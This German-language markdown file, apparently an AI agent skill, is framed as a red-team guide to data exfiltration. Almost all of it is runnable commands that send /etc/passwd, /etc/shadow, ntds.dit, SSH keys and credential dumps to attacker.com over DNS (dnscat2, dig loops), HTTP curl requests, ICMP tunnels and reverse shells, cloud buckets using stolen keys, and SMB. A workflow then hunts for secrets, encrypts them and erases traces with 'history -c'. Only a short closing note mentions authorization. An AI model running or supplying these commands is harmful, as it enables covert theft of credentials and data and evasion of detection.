---
name: data-exfiltration
description: Daten-Exfiltration – Techniken zum verdeckten Übertragen von Daten aus Zielnetzwerken
version: 1.0.0
---

# Daten-Exfiltration

## 概述 (Übersicht)

Daten-Exfiltration bezeichnet das verdeckte Übertragen von sensiblen Daten aus einem kompromittierten
Netzwerk zum Angreifer. Professionelle Red Teams testen, ob gestohlene Daten die Netzwerkgrenzen
unentdeckt passieren können. Verschiedene Protokolle und Covert Channels werden eingesetzt,
um Sicherheitslösungen (DLP, IDS/IPS, Firewalls) zu umgehen.

## Exfiltrations-Kanäle im Überblick

| Kanal | Stealth | Geschwindigkeit | Firewall-Bypass | Tools |
|-------|---------|-----------------|-----------------|-------|
| DNS | Sehr hoch | Langsam | Meist erlaubt | dnscat2, dnsteal |
| HTTP/HTTPS | Mittel | Schnell | Standard | exfil-http, curl |
| ICMP | Hoch | Sehr langsam | Oft erlaubt | icmpsh, ptunnel |
| Cloud Storage | Hoch | Schnell | CDN-Traffic | s3-exfil, aws cli |
| SMB | Niedrig | Schnell | Intern oft offen | impacket, netexec |
| Email | Mittel | Mittel | Oft erlaubt | smtp-exfil |

## DNS-Exfiltration

### dnscat2 (C2 + Exfiltration)

```bash
# Server auf Angreifer starten
ruby dnscat2.rb --dns domain=exfil.attacker.com --secret mysecret --no-cache

# Alternativ (direkter Modus, ohne Domain)
ruby dnscat2.rb --secret mysecret --dns server=<attacker_ip>,port=5353

# Nach Client-Verbindung
sessions          # Aktive Sessions anzeigen
session -i 1      # Session auswählen
shell             # Shell öffnen
download /etc/passwd /tmp/passwd  # Datei exfiltrieren
```

```bash
# Client auf Linux-Ziel
./dnscat --secret mysecret exfil.attacker.com

# Client auf Windows (PowerShell)
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSServer attacker.com -Domain exfil.attacker.com -PreSharedSecret mysecret
```

### DNSteal (Datei-Exfiltration via DNS-Queries)

```bash
# Server starten (Angreifer)
python3 dnsteal.py attacker.com -v

# Datei auf Ziel via DNS senden (Linux)
while IFS= read -r line; do
  encoded=$(echo -n "$line" | base64 | tr -d '=' | tr '+/' '-_')
  # In 60-Zeichen-Chunks aufteilen
  echo "$encoded" | fold -w 60 | while read chunk; do
    dig "${chunk}.file.attacker.com" @attacker.com +short > /dev/null 2>&1
    sleep 0.05
  done
done < /etc/passwd

# Windows PowerShell
$content = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\sensitive\file.txt"))
$chunks = $content -split "(?<=\G.{60})"
foreach($chunk in $chunks) {
  try { [System.Net.Dns]::GetHostEntry("$chunk.file.attacker.com") } catch {}
  Start-Sleep -Milliseconds 100
}
```

## HTTP/HTTPS-Exfiltration

### exfil-http Tool

```bash
# Empfangsserver starten (Angreifer)
exfil-http server 8080
# oder für HTTPS via Reverse Proxy (nginx/apache)

# Datei exfiltrieren (von Ziel)
exfil-http send_file /etc/passwd http://attacker.com:8080/collect
exfil-http send_file /tmp/ntds.dit https://attacker.com/api/update

# Chunked Exfiltration (stealthier, kleinere Requests)
exfil-http send_chunks /etc/shadow http://attacker.com:8080/img

# Großer Dump
exfil-http send_file /tmp/creds_dump.txt https://attacker.com:443/telemetry
```

### Manuelle cURL-Exfiltration

```bash
# Datei base64-kodiert via POST senden
curl -s -X POST https://attacker.com/collect \
  -H "Content-Type: application/json" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
  -d "{\"data\":\"$(base64 -w 0 /etc/passwd)\"}"

# Via GET-Parameter (getarnt als Web-Analytics)
curl -s "https://attacker.com/pixel.png?id=$(hostname | base64)&data=$(cat /etc/passwd | gzip | base64 -w 0 | head -c 500)"

# Multipart-Upload
curl -s -X POST https://attacker.com/upload \
  -F "file=@/etc/shadow" \
  -F "filename=shadow"
```

## ICMP-Exfiltration

### icmpsh (ICMP Reverse Shell)

```bash
# Setup (Angreifer)
sysctl -w net.ipv4.icmp_echo_ignore_all=1  # ICMP-Replies unterdrücken
icmpsh_m.py <attacker_ip> <target_ip>       # Listener starten

# Client (Windows-Ziel)
icmpsh.exe -t <attacker_ip> -d 500 -b 30 -s 128

# Cleanup
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```

### Manuelle ICMP-Daten-Exfiltration

```bash
# Daten in ICMP-Payload einbetten (Linux)
data=$(cat /etc/passwd | gzip | base64 | tr -d '\n')
echo "$data" | fold -w 32 | while read chunk; do
  ping -p "$(echo -n "$chunk" | xxd -p | head -c 32)" -c 1 -q attacker.com > /dev/null 2>&1
  sleep 0.2
done

# ptunnel – Vollständiger ICMP-Tunnel
ptunnel -p attacker.com -lp 8080 -da 127.0.0.1 -dp 22
# Dann via SSH durch den Tunnel
ssh -p 8080 user@127.0.0.1
```

## Cloud Storage Exfiltration

### AWS S3

```bash
# Mit gestohlenen IAM-Credentials
export AWS_ACCESS_KEY_ID=AKIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_DEFAULT_REGION=eu-west-1

# Exfiltrations-Bucket prüfen
aws s3 ls

# Sensible Daten hochladen
aws s3 cp /tmp/ntds.dit s3://attacker-bucket/exfil/ntds.dit
aws s3 cp /etc/passwd s3://attacker-bucket/exfil/passwd

# Ganzes Verzeichnis
aws s3 sync /home/ s3://attacker-bucket/home/

# Via Tool
s3-exfil s3_upload /tmp/sensitive.zip s3://attacker-bucket/dump.zip
```

### Azure Blob Storage

```bash
# Via SAS-Token (gestohlener Zugang)
az storage blob upload \
  --account-name <storage_account> \
  --container-name exfil \
  --file /tmp/creds.txt \
  --name creds.txt \
  --sas-token "?sv=2020-08-04&ss=b..."

# Via Service Principal
az login --service-principal -u <app_id> -p <password> --tenant <tenant_id>
s3-exfil azure_upload /tmp/data.zip exfil data.zip
```

### Google Cloud Storage

```bash
# Mit gestohlenen Service Account Credentials
export GOOGLE_APPLICATION_CREDENTIALS=/tmp/stolen_sa.json
gsutil cp /etc/passwd gs://attacker-bucket/exfil/

s3-exfil gcs_upload /tmp/dump.tar.gz gs://attacker-bucket/dump.tar.gz
```

## Covert Channel Techniken

### Steganographie für Exfiltration

```bash
# Daten in Bild verstecken
steghide embed -cf cover.jpg -sf /tmp/secrets.txt -p password
# Bild über normalen HTTP-Upload exfiltrieren

# Zsteg (PNG-Steganographie)
zsteg -a cover.png  # Versteckte Daten finden

# ImageMagick LSB-Steganographie
convert cover.png -depth 8 -type TrueColor temp.png
# Daten in LSB einbetten (custom script)
```

### SMB-Exfiltration (interne Weitergabe)

```bash
# Dateien via SMB auf Angreifer-Share kopieren
smbclient //attacker.com/share -U user%pass
# put /etc/passwd passwd

# Via Impacket
python3 smbclient.py corp.local/admin:pass@attacker.com
# use share
# put /tmp/dump.zip dump.zip

# Vom Zielsystem zu internem Angreifer-Share
net use Z: \\attacker.com\share /user:attacker password
copy C:\sensitive\* Z:\
```

## Exfiltrations-Workflow (Best Practice)

```bash
# 1. Zu exfiltrierende Daten identifizieren
find / -name "*.pem" -o -name "*.key" -o -name "id_rsa" 2>/dev/null
find / -name "*.cfg" -o -name "*.conf" 2>/dev/null | xargs grep -l "password"
# Windows: dir /s /b C:\Users\*password*.txt

# 2. Daten vorbereiten (komprimieren + verschlüsseln)
tar czf /tmp/exfil.tar.gz /home/user/.ssh/ /etc/passwd /etc/shadow
openssl enc -aes-256-cbc -in /tmp/exfil.tar.gz -out /tmp/exfil.enc -k secretkey

# 3. Exfiltrations-Kanal wählen (basierend auf Netzwerk-Restriktionen)
# - DNS: Falls nur DNS nach außen erlaubt
# - HTTPS: Falls normaler Web-Traffic erlaubt
# - Cloud: Falls CDN/Cloud-Traffic erlaubt

# 4. Exfiltrieren
exfil-http send_file /tmp/exfil.enc https://attacker.com/api/collect

# 5. Spuren verwischen
rm -f /tmp/exfil.tar.gz /tmp/exfil.enc
history -c
```

## Testcheckliste

### Vorbereitung
- [ ] Exfiltrations-Ziel (Server/Domain) eingerichtet
- [ ] Mindestens zwei Exfiltrations-Kanäle konfiguriert
- [ ] DLP-Lösung des Ziels identifiziert

### Exfiltrations-Tests
- [ ] DNS-Exfiltration (dnscat2/dnsteal) getestet
- [ ] HTTP/HTTPS-Exfiltration verifiziert
- [ ] ICMP-Kanal geprüft (falls DNS/HTTP blockiert)
- [ ] Cloud-Storage-Upload getestet (S3/Azure/GCS)
- [ ] Daten vor Exfiltration verschlüsselt

### Erkennung
- [ ] Volumen: Kleine Chunks zur Erkennung-Vermeidung
- [ ] Timing: Rate-Limiting implementiert
- [ ] Traffic: Als legitimer Traffic getarnt

## Wichtige Hinweise

- **Ausschließlich in autorisierten Scope** – Daten niemals unkontrolliert exfiltrieren
- **Daten-Integrität**: Exfiltrierte Daten sicher aufbewahren und nach Test löschen
- **DSGVO/Datenschutz**: Echte Personendaten im Test vermeiden
- **Größenlimits beachten**: DNS-Exfiltration sehr langsam (max. ~1KB/s)
